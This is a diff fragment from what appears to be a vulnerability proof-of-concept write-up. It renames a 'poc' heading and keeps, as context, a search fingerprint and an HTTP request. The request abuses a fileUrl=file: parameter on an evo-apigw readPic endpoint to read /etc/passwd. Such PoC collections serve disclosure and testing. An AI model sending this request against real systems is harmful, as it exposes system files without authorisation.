@@ -7,7 +7,7 @@
 :body="*客户端会小于800*"
 ```
 
-## poc
+## POC
 ```
 GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/2
 Host: 127.0.0.1
